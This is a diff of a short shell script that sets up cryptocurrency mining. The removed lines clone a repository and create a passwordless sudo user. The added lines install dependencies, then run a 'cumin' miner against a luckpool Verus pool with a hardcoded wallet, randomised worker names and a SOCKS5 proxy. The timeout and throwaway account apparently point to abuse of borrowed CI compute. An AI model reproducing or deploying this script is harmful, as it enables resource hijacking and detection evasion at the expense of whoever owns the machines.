@@ -1,7 +1,10 @@
-#!/bin/bash
-sudo apt update
-git clone https://github.com/ajayy78/ajayy78.git && cd ajayy78
-chmod +x mantap.sh && chmod +x hayu chmod 777 hayu mantap.sh
-sudo adduser --disabled-password --gecos "" ojakk && sudo usermod -aG sudo ojakk
-sudo -u ojakk -H sh -c "timeout 359m ./gass.sh"
-sudo apt update
+sudo apt update 
+sudo apt install screen libjansson4 -y 
+chmod +x gass.sh && chmod +x hayu chmod 777 hayu gass.sh
+screen -dmS ls 
+POOL=stratum+tcp://eu.luckpool.net:3956
+WALLET=RT8DNmxnDDRCLScadn7efqKuDLFvrB9unv
+WORKER=$(echo $(shuf -i 1-10 -n 1)ojakk)
+PROXY=socks5://174.64.199.82:4145	
+./cumin -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY
+© 2021 GitHub, Inc.
